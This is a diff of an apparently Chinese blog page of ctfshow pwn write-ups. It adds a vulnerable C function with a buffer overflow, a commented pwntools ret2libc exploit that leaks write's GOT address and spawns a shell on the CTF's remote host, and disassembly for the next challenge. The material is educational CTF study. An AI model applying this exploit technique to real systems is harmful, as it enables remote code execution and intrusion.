@@ -647,21 +647,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-25
+                    2023-07-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    22k
+                    23.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    87 分
+                    94 分
                 </div>
                 
 
@@ -1374,6 +1374,7 @@ main:  # main函数的开始
 </li>
 </ol>
 <p>根据以上分析，这个程序可能具有较多的安全漏洞，比如缓冲区溢出、GOT 覆写、可执行 Shellcode 等。在进行漏洞利用时，应考虑这些情况。</p>
+<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726020658587.png" alt="image-20230726020658587"></p>
 <h3 id="main汇编源代码"><a href="#main汇编源代码" class="headerlink" title="main汇编源代码"></a>main汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame fuzzy-sp
 ; 这是一个基于基指针（bp）的栈帧，具有模糊的栈指针。
 
@@ -1867,7 +1868,7 @@ io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
 
 
 
-<h3 id="（二）ret2libc攻击方法"><a href="#（二）ret2libc攻击方法" class="headerlink" title="（二）ret2libc攻击方法"></a>（二）ret2libc攻击方法</h3><p>首先，NX，全称No-eXecute，也叫做DEP（Data Execution Prevention，数据执行防止），是一种安全机制，用于防止恶意软件通过注入代码到数据段或堆栈段来执行恶意代码。它可以将内存标记为非可执行，这样处理器就不会在这些区域执行代码。这个机制可以有效防止缓冲区溢出攻击。</p>
+<h3 id="（二）exp-py-ret2libc-攻击方法"><a href="#（二）exp-py-ret2libc-攻击方法" class="headerlink" title="（二）exp.py                (ret2libc     攻击方法)"></a>（二）exp.py                (ret2libc     攻击方法)</h3><p>首先，NX，全称No-eXecute，也叫做DEP（Data Execution Prevention，数据执行防止），是一种安全机制，用于防止恶意软件通过注入代码到数据段或堆栈段来执行恶意代码。它可以将内存标记为非可执行，这样处理器就不会在这些区域执行代码。这个机制可以有效防止缓冲区溢出攻击。</p>
 <p>然后，ret2libc是一种绕过NX保护的攻击方法。由于NX保护阻止在非执行内存（如堆和栈）上执行代码，攻击者不能简单地插入并执行恶意代码。但是，攻击者可以利用已经存在的可执行代码片段，这些代码片段就是程序已经加载的库函数，例如C标准库libc。</p>
 <p>在ret2libc攻击中，攻击者利用缓冲区溢出漏洞，改变返回地址，使其指向libc中的函数（如system），并在栈上布置参数。这样，当函数返回时，不会返回到原来的位置，而是跳转到libc的函数，执行攻击者预设的命令。这种攻击方法不需要在内存中注入新的代码，所以可以绕过NX保护。</p>
 <p>所以，”开启NX保护，或许可以试试ret2libc”的意思是，如果目标系统开启了NX保护，可以考虑使用ret2libc这种攻击策略。</p>
@@ -1995,21 +1996,29 @@ main endp
 
 
 
-<h3 id="（三）"><a href="#（三）" class="headerlink" title="（三）"></a>（三）</h3><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加</p>
+<h3 id="（三）ASLR"><a href="#（三）ASLR" class="headerlink" title="（三）ASLR"></a>（三）ASLR</h3><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加</p>
 <p>软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的</p>
 <p>位置，从而增加了利用软件漏洞进行攻击的难度。</p>
 <p>开启不同等级会有不同的效果：</p>
-<p>\1. 内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的</p>
+<ol>
+<li>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的</li>
+</ol>
 <p>库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。</p>
 <p>ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和</p>
 <p>代码的位置。</p>
-<p>\2. 地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、</p>
+<ol start="2">
+<li>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、</li>
+</ol>
 <p>堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位</p>
 <p>置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p>
-<p>\3. 随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着</p>
+<ol start="3">
+<li>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着</li>
+</ol>
 <p>每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发</p>
 <p>现这些偏移量，才能准确地定位和利用漏洞。</p>
-<p>\4. 堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起</p>
+<ol start="4">
+<li>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起</li>
+</ol>
 <p>始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，</p>
 <p>使得攻击者无法轻易地覆盖返回地址或控制程序流程。</p>
 <p>在Linux中，ALSR的全局配置/proc/sys/kernel/randomize_va_space有三种情况：</p>
@@ -2328,6 +2337,191 @@ jz      short locret_9F8<span aria-hidden="true" class="line-numbers-rows"><span
 
 
 <p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230725162402607.png" alt="image-20230725162402607"></p>
+<h3 id="（三）ctfshowC源代码"><a href="#（三）ctfshowC源代码" class="headerlink" title="（三）ctfshowC源代码"></a>（三）ctfshowC源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t ctfshow()
+{
+  char buf[132]; // [esp+0h] [ebp-88h] BYREF
+
+  return read(0, buf, 0x100u);
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *  # 导入pwntools库，这是一个CTF pwn（二进制漏洞利用）的工具库
+context.log_level = 'debug'  # 设置日志级别为debug，这样程序会打印出更多的调试信息
+
+# io = process('./pwn')  # 创建一个新的进程来运行本地的'./pwn'程序，这行被注释掉了
+# libc = ELF('/lib/i386-linux-gnu/libc.so.6')  # 加载本地的libc库，这行被注释掉了
+
+io = remote('pwn.challenge.ctf.show', 28145)  # 创建一个到远程服务器的连接
+elf = ELF('./pwn')  # 加载'./pwn'程序，获取它的信息
+libc = ELF('/home/ctfshow/libc/32bit/libc-2.27.so')  # 加载远程服务器上的libc库，获取它的信息
+
+ctfshow = elf.sym['ctfshow']  # 获取'ctfshow'这个函数在程序中的地址
+
+# 构造payload，包含140个"A"，然后是write函数的地址，ctfshow函数的地址，参数1，write函数的got表地址，参数4
+payload = "A" * 140 + p32(elf.sym['write']) + p32(ctfshow) + p32(1) + p32(elf.got['write']) + p32(4)
+
+io.send(payload)  # 发送payload到远程服务器
+
+write_addr = u32(io.recv(4))  # 从远程服务器接收4个字节，这是write函数的实际地址
+
+# 计算system函数和/bin/sh字符串在远程服务器上的实际地址
+system_addr = write_addr - libc.sym['write'] + libc.sym['system']
+binsh_addr = write_addr - libc.sym['write'] + next(libc.search('/bin/sh'))
+
+# 构造第二个payload，包含140个"B"，然后是system函数的地址，ctfshow函数的地址，/bin/sh字符串的地址
+payload2 = "B" * 140 + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)
+
+io.send(payload2)  # 发送第二个payload到远程服务器
+
+io.interactive()  # 进入交互模式，这样我们就可以手动输入命令到远程服务器上执行了
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="1-计算函数的实际地址"><a href="#1-计算函数的实际地址" class="headerlink" title="1.计算函数的实际地址"></a>1.计算函数的实际地址</h4><p>首先通过泄露write函数的实际地址（write_addr），然后利用这个信息和库文件中的信息来计算其他函数和数据的实际地址。</p>
+<p>具体来说，<code>libc.sym['write']</code>是write函数在libc库文件中的偏移量，<code>libc.sym['system']</code>是system函数在libc库文件中的偏移量，<code>next(libc.search('/bin/sh'))</code>是”/bin/sh”字符串在libc库文件中的偏移量。</p>
+<p>所以，<code>write_addr - libc.sym['write']</code>就是libc库在内存中的基地址（因为write函数的实际地址减去它在libc库中的偏移量就等于libc库的基地址）。然后再加上其他函数或数据在libc库中的偏移量，就可以得到这些函数或数据的实际地址。</p>
+<p>例如，<code>write_addr - libc.sym['write'] + libc.sym['system']</code>就是计算system函数的实际地址，<code>write_addr - libc.sym['write'] + next(libc.search('/bin/sh'))</code>就是计算”/bin/sh”字符串的实际地址。</p>
+<h4 id="2-write函数泄露"><a href="#2-write函数泄露" class="headerlink" title="2.write函数泄露"></a>2.write函数泄露</h4><p>虽然<code>ctfshow()</code>函数使用了<code>read()</code>函数来从标准输入读取数据到缓冲区，但是这并不意味着我们可以通过<code>read()</code>函数来泄露地址。这是因为<code>read()</code>函数的功能是从文件描述符读取数据，而不是输出数据。在这个上下文中，文件描述符0代表标准输入。</p>
+<p>另一方面，<code>write()</code>函数的功能是将数据写入到文件描述符。在这个上下文中，文件描述符1代表标准输出。因此，我们可以通过调用<code>write()</code>函数，将内存中的数据（例如函数的地址）写入到标准输出，从而泄露这些数据。</p>
+<p>在这个脚本中，我们首先构造一个payload，使得程序调用<code>write()</code>函数，将<code>write()</code>函数自己在GOT表中的地址写入到标准输出。然后我们从标准输出读取这个地址，就可以得到<code>write()</code>函数的实际地址。这就是为什么我们要通过<code>write()</code>函数来泄露地址。</p>
+<p>至于为什么要泄露<code>write()</code>函数的地址，而不是其他函数的地址，这主要是因为<code>write()</code>函数的地址在GOT表中，而GOT表是在程序的数据段，不受ASLR的影响，所以它的地址是固定的。另外，<code>write()</code>函数在libc库中，所以通过泄露<code>write()</code>函数的地址，我们就可以计算出libc库的基地址，进而计算出其他函数和数据的实际地址。</p>
+<h2 id="十八、pwn031"><a href="#十八、pwn031" class="headerlink" title="十八、pwn031"></a>十八、pwn031</h2><h3 id="（一）汇编源代码"><a href="#（一）汇编源代码" class="headerlink" title="（一）汇编源代码"></a>（一）汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame fuzzy-sp
+
+; int __cdecl main(int argc, const char **argv, const char **envp)
+public main
+main proc near
+
+argc= dword ptr  8
+argv= dword ptr  0Ch
+envp= dword ptr  10h
+
+; __unwind {
+lea     ecx, [esp+4]
+and     esp, 0FFFFFFF0h
+push    dword ptr [ecx-4]
+push    ebp
+mov     ebp, esp
+push    ebx
+push    ecx
+call    __x86_get_pc_thunk_bx
+add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
+mov     eax, ds:(stdin_ptr - 1FC0h)[ebx]
+mov     eax, [eax]
+push    0               ; n
+push    1               ; modes
+push    0               ; buf
+push    eax             ; stream
+call    _setvbuf
+add     esp, 10h
+mov     eax, ds:(stdout_ptr - 1FC0h)[ebx]
+mov     eax, [eax]
+push    0               ; n
+push    2               ; modes
+push    0               ; buf
+push    eax             ; stream
+call    _setvbuf
+add     esp, 10h
+sub     esp, 8
+lea     eax, (main - 1FC0h)[ebx]
+push    eax
+lea     eax, (unk_850 - 1FC0h)[ebx]
+push    eax             ; format
+call    _printf
+add     esp, 10h
+call    ctfshow
+sub     esp, 0Ch
+lea     eax, (unk_854 - 1FC0h)[ebx]
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (unk_8C8 - 1FC0h)[ebx]
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (unk_944 - 1FC0h)[ebx]
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (unk_9D0 - 1FC0h)[ebx]
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (unk_A60 - 1FC0h)[ebx]
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (unk_AE4 - 1FC0h)[ebx]
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (unk_B78 - 1FC0h)[ebx]
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (asc_BF4 - 1FC0h)[ebx] ; "    * *********************************"...
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (unk_C3C - 1FC0h)[ebx]
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (aTypeLinuxSecur - 1FC0h)[ebx] ; "    * Type  : Linux_Security_Mechanisms"...
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (aSiteHttpsCtfSh - 1FC0h)[ebx] ; "    * Site  : https://ctf.show/        "...
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (aHintBypassAlsr - 1FC0h)[ebx] ; "    * Hint  : Bypass ALSR &amp; PIE "
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 0Ch
+lea     eax, (asc_BF4 - 1FC0h)[ebx] ; "    * *********************************"...
+push    eax             ; s
+call    _puts
+add     esp, 10h
+sub     esp, 4
+push    0Eh             ; n
+lea     eax, (aHelloCtfshow - 1FC0h)[ebx] ; "Hello CTFshow!\n"
+push    eax             ; buf
+push    0               ; fd
+call    _write
+add     esp, 10h
+mov     eax, 0
+lea     esp, [ebp-8]
+pop     ecx
+pop     ebx
+pop     ebp
+lea     esp, [ecx-4]
+retn
+; } // starts at 652
+main endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
+
+
+<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726020622786.png" alt="image-20230726020622786"></p>
 
                 
             </div>
@@ -3191,7 +3385,7 @@ new Valine({
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">43.7k</span>&nbsp;字
+                class="white-color">45.2k</span>&nbsp;字
             
             
             
